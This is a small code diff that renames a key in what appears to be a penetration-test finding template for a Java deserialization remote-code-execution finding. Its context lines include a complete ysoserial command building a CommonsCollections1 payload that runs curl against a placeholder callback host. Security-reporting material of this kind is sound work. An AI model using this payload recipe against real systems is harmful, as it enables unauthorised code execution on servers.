@@ -142,14 +142,14 @@ save_finding(
     parameter="session_cookie",
     severity="critical",
     evidence={
-        "logger_index": <rce-confirming index>,
+        "proxy_history_index": <rce-confirming index>,
         "collaborator_interaction_id": "<id>",
         "summary": "Java deserialization via CommonsCollections1 — base64'd session cookie reaches readObject; RCE chain exec'd `curl COLLABORATOR/marker` → DNS+HTTP confirmed.",
         "format": "java_serialized",                  # or dotnet_viewstate, php_unserialize, python_pickle, ruby_marshal, node_serialize
         "gadget_chain": "CommonsCollections1",
         "ysoserial_command": "java -jar ysoserial.jar CommonsCollections1 'curl http://COLLABORATOR/marker'",
         "reproductions": [
-            {"logger_index": ..., "elapsed_ms": ..., "status_code": ...},
+            {"proxy_history_index": ..., "elapsed_ms": ..., "status_code": ...},
             ...,
         ],
     },
